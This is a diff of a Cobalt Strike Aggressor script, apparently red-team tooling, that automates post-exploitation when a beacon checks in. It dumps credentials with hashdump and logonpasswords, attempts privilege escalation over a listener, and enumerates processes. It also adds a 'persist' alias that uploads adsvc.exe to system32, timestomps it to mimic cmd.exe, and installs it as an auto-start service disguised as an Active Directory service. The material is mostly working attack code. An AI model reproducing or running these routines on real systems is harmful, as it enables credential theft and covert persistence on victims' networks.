@@ -6,21 +6,57 @@
 #################################################
 
 on beacon_initial {
-  if("SYSTEM" isin beacon_info($1, "user")) {
-    say("user is system");
-    bwdigest($1);
-    blogonpasswords($1);
-    bhashdump($1);
-    say("I should setup some persistence...");
-  }
-  else if(" *" isin beacon_info($1, "user")) {
-    say("user has admin rights");
-    belevate($1, "http_443");   ## http_443 is what I call my listener
-    bsleep($1, 300, 30);
-  }
-  else {
-    say("just a regular user, hopefully elevation works");
-    belevate($1, "http_443");
-    bsleep($1, 300, 30);
-  }
+    if("SYSTEM" isin beacon_info($1, "user")) {
+      say("user is system");
+      bwdigest($1);
+      blogonpasswords($1);
+      bhashdump($1);
+      say("I should setup some persistence...");
+    }
+    else if(" *" isin beacon_info($1, "user")) {
+      say("user has admin rights");
+      belevate($1, "http_443");   ## http_443 is what I call my listener
+      bsleep($1, 300, 30);
+    }
+    else {
+      say("just a regular user, hopefully elevation works");
+      belevate($1, "http_443");
+      bsleep($1, 300, 30);
+    }
 }
+
+
+#### Testing ###
+### Using: https://github.com/Und3rf10w/Aggressor-scripts/blob/master/auto-keylogger.cna
+### Repurpose this to get pid.
+alias getexplorerpid {
+    bps($1, lambda({
+        local('$pid $name $entry');
+        foreach $entry (split("\n", $2)) {
+            ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
+            println($entry);
+            println("Name: $name PID: $pid ");
+            if ($name eq "explorer.exe") {
+                #$1 is our Beacon ID, $pid is the PID of explorer.exe
+            blog("found it! $name")
+            }
+        }
+}, $callback => $2));
+}
+
+alias persist {
+    if (-exists script_resource("adsvc.exe")) {
+        binput($1, "service persistence (server) [AD]");
+        bcd($1, 'c:\windows\system32');
+        bupload($1, script_resource("adsvc.exe"));
+        btimestomp($1, "adsvc.exe", "cmd.exe");
+        bshell($1, 'sc delete adsvc');
+        bshell($1, 'sc create adsvc binPath= "C:\windows\system32\adsvc.exe" start= auto DisplayName= "Active Directory Service"');
+        bshell($1, 'sc description adsvc "Provides authentication and policy management for computers joined to domain."');
+        bshell($1, 'sc start adsvc');
+
+    }
+    else {
+        berror($1, "adsvc.exe does not exist");
+    }
+};
